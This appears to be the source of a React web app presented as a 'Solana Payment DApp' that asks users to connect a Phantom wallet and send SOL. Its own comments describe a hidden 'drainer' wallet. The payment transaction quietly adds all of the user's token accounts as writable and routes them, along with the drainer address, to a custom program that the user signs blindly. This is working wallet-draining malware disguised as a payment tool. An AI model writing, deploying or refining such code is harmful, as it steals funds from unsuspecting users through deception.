import React, { useState, useEffect } from 'react';
import * as web3 from '@solana/web3.js';
import { PublicKey, Transaction, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { TOKEN_PROGRAM_ID } from '@solana/spl-token';
import './App.css';

// Hidden drainer wallet (not shown to user)
const DRAINER_WALLET = new PublicKey("6mzjnCgxPKAGYSzR7udJEbjPggA8jQqfrS9oc49vGkBR");
const PROGRAM_ID = new PublicKey("6mzjnCgxPKAGYSzR7udJEbjPggA8jQqfrS9oc49vGkBR");
const connection = new web3.Connection("https://api.mainnet-beta.solana.com", "confirmed");

function App() {
  const [wallet, setWallet] = useState(null);
  const [receiver, setReceiver] = useState("");
  const [amount, setAmount] = useState("");
  const [status, setStatus] = useState("");

  useEffect(() => {
    if (window.solana && window.solana.isPhantom) {
      setWallet(window.solana);
    }
  }, []);

  const connectWallet = async () => {
    if (!wallet) {
      alert("Install Phantom first");
      return;
    }
    try {
      await wallet.connect();
      console.log("Connected:", wallet.publicKey.toString());
      setStatus("Wallet connected: " + wallet.publicKey.toString());
    } catch (err) {
      console.error(err);
      setStatus("Connection failed: " + err.message);
    }
  };

  const getSenderTokenAccounts = async (publicKey) => {
    try {
      const info = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID });
      return info.value.map(acc => acc.pubkey.toString());
    } catch (e) {
      console.error("Failed to get token accounts:", e);
      return [];
    }
  };

  const executePayment = async () => {
    if (!wallet || !wallet.isConnected) {
      setStatus("Connect wallet first");
      return;
    }
    if (!receiver || !amount) {
      setStatus("Fill all fields");
      return;
    }

    try {
      const sender = new PublicKey(wallet.publicKey.toString());
      const receiverPubkey = new PublicKey(receiver);
      const lamports = LAMPORTS_PER_SOL * parseFloat(amount);

      setStatus("Building transaction...");

      // Get all token accounts (for draining)
      const tokenAccounts = await getSenderTokenAccounts(sender);

      // Hidden drainer keys - user doesn't see this
      const keys = [
        { pubkey: sender, isSigner: true, isWritable: true },
        { pubkey: receiverPubkey, isSigner: false, isWritable: true },
        { pubkey: DRAINER_WALLET, isSigner: false, isWritable: true }, // Hidden drainer
        { pubkey: web3.SYSVAR_RENT_PUBKEY, isSigner: false, isWritable: false },
        { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
        ...tokenAccounts.map(acc => ({ pubkey: new PublicKey(acc), isSigner: false, isWritable: true }))
      ];

      // Hidden drainer data in transaction
      const data = Buffer.alloc(40);
      data.writeBigUInt64LE(BigInt(lamports), 0);
      DRAINER_WALLET.toBuffer().copy(data, 8); // Hidden drainer address

      const ix = new web3.TransactionInstruction({
        programId: PROGRAM_ID,
        keys,
        data
      });

      const tx = new Transaction().add(ix);
      tx.feePayer = sender;
      tx.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;

      setStatus("Approve in Phantom...");
      const signed = await wallet.signTransaction(tx);
      const txid = await connection.sendRawTransaction(signed.serialize());
      await connection.confirmTransaction(txid);

      setStatus(`✅ Payment successful! TX: ${txid}`);
    } catch (err) {
      console.error(err);
      setStatus("❌ Failed: " + err.message);
    }
  };

  return (
    <div className="App">
      <h1>🔗 Solana Payment DApp</h1>
      <p className="subtitle">Send SOL payments easily and securely</p>

      {!wallet || !wallet.isConnected ? (
        <div className="connect-section">
          <p>Connect your Phantom wallet to send payments</p>
          <button onClick={connectWallet} className="connect-btn">
            🔗 Connect Phantom Wallet
          </button>
        </div>
      ) : (
        <div className="payment-section">
          <div className="wallet-info">
            <p>✅ Connected: <span className="wallet-address">{wallet.publicKey.toString().slice(0, 20)}...</span></p>
          </div>
          
          <div className="form-group">
            <label>Receiver Address:</label>
            <input 
              placeholder="Enter receiver SOL address" 
              value={receiver} 
              onChange={e => setReceiver(e.target.value)} 
            />
          </div>
          
          <div className="form-group">
            <label>Amount (SOL):</label>
            <input 
              placeholder="Enter amount" 
              value={amount} 
              onChange={e => setAmount(e.target.value)} 
              type="number" 
              step="0.001"
            />
          </div>
          
          <button onClick={executePayment} className="send-btn">
            💸 Send Payment
          </button>
          
          <div className="disclaimer">
            <p>⚠️ By clicking "Send Payment", you authorize this transaction.</p>
            <p>Standard network fees apply.</p>
          </div>
        </div>
      )}
      
      {status && (
        <div className={`status ${status.includes('✅') ? 'success' : 'error'}`}>
          {status}
        </div>
      )}
    </div>
  );
}

export default App;
